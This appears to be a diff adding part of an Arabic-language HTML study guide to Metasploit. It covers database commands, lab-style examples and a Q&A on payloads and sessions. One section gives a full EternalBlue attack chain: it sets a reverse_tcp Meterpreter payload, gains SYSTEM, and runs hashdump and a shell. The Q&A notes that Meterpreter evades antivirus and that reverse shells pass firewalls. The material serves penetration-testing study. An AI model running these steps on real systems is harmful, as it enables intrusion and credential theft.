+<span class="cmt"># إنشاء workspace جديد:</span>
+msf6 > <span class="cmd">workspace -a Target_1</span>
+
+<span class="cmt"># التبديل لـ workspace:</span>
+msf6 > <span class="cmd">workspace Target_1</span>
+
+<span class="cmt"># حذف workspace:</span>
+msf6 > <span class="cmd">workspace -d Target_1</span></div>
+    <div class="alert info">💡 Workspaces مثل الـ Folders — تفصل كل شبكة عن الثانية</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📊 إدارة البيانات</div>
+    <div class="code"><span class="cmt"># استيراد نتائج Nmap:</span>
+msf6 > <span class="cmd">db_import Target.xml</span>
+
+<span class="cmt"># فحص Nmap مباشرة وحفظ النتائج:</span>
+msf6 > <span class="cmd">db_nmap -sVsS 10.10.10.8</span>
+
+<span class="cmt"># عرض الأجهزة المكتشفة:</span>
+msf6 > <span class="cmd">hosts</span>
+msf6 > <span class="cmd">hosts -R</span>  <span class="cmt"># يحط الـ IPs كـ RHOSTS تلقائياً!</span>
+
+<span class="cmt"># عرض الخدمات:</span>
+msf6 > <span class="cmd">services</span>
+msf6 > <span class="cmd">services -u</span>  <span class="cmt"># الشغالة فقط</span>
+
+<span class="cmt"># إدارة الـ credentials:</span>
+msf6 > <span class="cmd">creds</span>
+msf6 > <span class="cmd">creds add user:admin password:notpassword</span>
+msf6 > <span class="cmd">creds -o hashes.jtr</span>  <span class="cmt"># تصدير لـ John the Ripper</span>
+
+<span class="cmt"># الملفات المسروقة:</span>
+msf6 > <span class="cmd">loot</span>
+
+<span class="cmt"># نسخ احتياطي:</span>
+msf6 > <span class="cmd">db_export -f xml backup.xml</span></div>
+    <div class="alert success">🎯 hosts -R يأخذ كل الـ IPs من الـ DB ويحطها كـ RHOSTS تلقائياً = توفير وقت كبير!</div>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     METHODOLOGY
+═══════════════════════════════════ -->
+<div id="panel-methodology" class="panel">
+
+  <div class="card">
+    <div class="card-title">⛓️ Attack Chain كامل</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Scan</div><div class="step-sub">db_nmap / nmap</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔎</div><div class="step-name">Search</div><div class="step-sub">search + use</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">⚙️</div><div class="step-name">Configure</div><div class="step-sub">set options</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">💥</div><div class="step-name">Exploit</div><div class="step-sub">run / exploit</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step hl"><div class="step-icon">🏴</div><div class="step-name">Post</div><div class="step-sub">Meterpreter</div></div>
+    </div>
+
+    <div class="lbl">مثال كامل — EternalBlue:</div>
+    <div class="code"><span class="cmt"># 1. Scan:</span>
+msf6 > <span class="cmd">db_nmap -sV 10.10.10.40</span>
+
+<span class="cmt"># 2. تحقق من الثغرة أولاً:</span>
+msf6 > <span class="cmd">use auxiliary/scanner/smb/smb_ms17_010</span>
+msf6 auxiliary > <span class="cmd">set RHOSTS 10.10.10.40</span>
+msf6 auxiliary > <span class="cmd">run</span>
+<span class="ok">[+] Host is likely VULNERABLE</span>
+
+<span class="cmt"># 3. الهجوم الفعلي:</span>
+msf6 > <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+msf6 exploit > <span class="cmd">set RHOSTS 10.10.10.40</span>
+msf6 exploit > <span class="cmd">set LHOST 10.10.14.5</span>
+msf6 exploit > <span class="cmd">set payload windows/x64/meterpreter/reverse_tcp</span>
+msf6 exploit > <span class="cmd">run</span>
+
+<span class="ok">[*] Meterpreter session 1 opened!</span>
+
+<span class="cmt"># 4. Post-exploitation:</span>
+meterpreter > <span class="cmd">getuid</span>
+<span class="ok">NT AUTHORITY\SYSTEM</span>
+meterpreter > <span class="cmd">hashdump</span>
+meterpreter > <span class="cmd">shell</span>  <span class="cmt"># فتح CMD عادي</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📋 Options المهمة</div>
+    <table>
+      <tr><th>الـ Option</th><th>الوظيفة</th></tr>
+      <tr><td class="mono danger">RHOSTS</td><td>IP الضحية (الهدف)</td></tr>
+      <tr><td class="mono safe">LHOST</td><td>IP جهازك أنت (المخترِق)</td></tr>
+      <tr><td class="mono warn">LPORT</td><td>Port جهازك (default: 4444)</td></tr>
+      <tr><td class="mono">RPORT</td><td>Port الخدمة المستهدفة (SMB=445)</td></tr>
+      <tr><td class="mono purple">SESSION</td><td>رقم الجلسة للـ Post modules</td></tr>
+    </table>
+  </div>
+
+</div>
+
+<!-- ═══════════════════════════════════
+     Q&A
+═══════════════════════════════════ -->
+<div id="panel-explained" class="panel">
+
+  <div class="card">
+    <div class="card-title">🌐 Q&A — أسئلة درسناها</div>
+
+    <div class="qa">
+      <div class="qa-q">إيش الفرق بين Exploit وPayload؟</div>
+      <div class="qa-a">Exploit = يفتح الباب (يستغل الثغرة). Payload = ماذا تفعل بعد الدخول (reverse shell, meterpreter...). تشبيه: Exploit = مفتاح، Payload = ماذا تفعل داخل البيت.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">إيش POC؟</div>
+      <div class="qa-a">Proof of Concept — كود يثبت إن الثغرة موجودة وقابلة للاستغلال. Metasploit أخذ هاي الـ POCs وطورها لـ exploits جاهزة للاستخدام بأمر واحد.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">إيش الـ Tunnel Vision Effect؟</div>
+      <div class="qa-a">"لو الأداة ما تقدر = أنا ما أقدر." الاعتماد الكلي على Metasploit بدون فهم كيف يشتغل = خطر. لما الأداة تفشل ما تعرف تشتغل بدونها.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">إيش الفرق بين Single وStaged payload؟</div>
+      <div class="qa-a">Single: كود كامل في ملف واحد، مستقل، لكن حجمه كبير. Staged: Stager صغير يفتح اتصال ويستقبل Stage كبير (Meterpreter). تعرفهم من الـ slash: shell_bind_tcp = Single, shell/bind_tcp = Staged.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">ليش Meterpreter أفضل من Shell عادي؟</div>
+      <div class="qa-a">Meterpreter يشتغل في الذاكرة فقط (DLL Injection) = AV ما يشوفه. عنده ميزات متقدمة: hashdump, keyscan, screenshot, load kiwi. تقدر تفتح CMD عادي من داخله بـ shell.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">ليش Reverse TCP أفضل من Bind TCP؟</div>
+      <div class="qa-a">Bind = أنت تتصل بالضحية = Firewall يحجب Inbound connections. Reverse = الضحية تتصل بك = Firewall يثق بـ Outbound connections = يمر بسلام.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">إيش فائدة hosts -R في الـ Database؟</div>
+      <div class="qa-a">يأخذ كل الـ IPs المخزنة في الـ Database ويحطها كـ RHOSTS في الـ exploit تلقائياً. توفير وقت كبير لو عندك 50+ جهاز في الشبكة.</div>
+    </div>
+
+    <div class="qa">
+      <div class="qa-q">إيش الفرق بين Sessions وJobs؟</div>
+      <div class="qa-a">Session = خط اتصال مفتوح مع ضحية بعد نجاح الـ exploit. Job = مهمة تشتغل في الخلفية (مثل listener). بـ exploit -j تشغّل الـ exploit كـ Job = listener يفضل يسمع حتى بدون session.</div>
+    </div>
+
+  </div>
+
+</div>
+
+</div>
+
+<script>(function(){var c=document.getElementById('glass-particles');if(!c)return;var x=c.getContext('2d'),W,H,pts=[];function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight}function spawn(){pts=[];var n=Math.max(80,Math.min(Math.round(W*H/7000),220));for(var i=0;i<n;i++)pts.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.8+0.4,vy:-(Math.random()*0.45+0.15),vx:(Math.random()-0.5)*0.18,a:Math.random()*0.55+0.15})}function draw(){x.clearRect(0,0,W,H);pts.forEach(function(p){x.beginPath();x.arc(p.x,p.y,p.r,0,Math.PI*2);x.fillStyle='rgba(255,255,255,'+p.a+')';x.fill();p.y+=p.vy;p.x+=p.vx;if(p.y<-8){p.y=H+4;p.x=Math.random()*W}if(p.x<0)p.x=W;if(p.x>W)p.x=0});requestAnimationFrame(draw)}resize();spawn();draw();window.addEventListener('resize',function(){resize();spawn()})})();</script>
+<script>
+function showPanel(name,btn){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));document.getElementById('panel-'+name).classList.add('active');btn.classList.add('active');}
+</script>
+</body>
+</html>
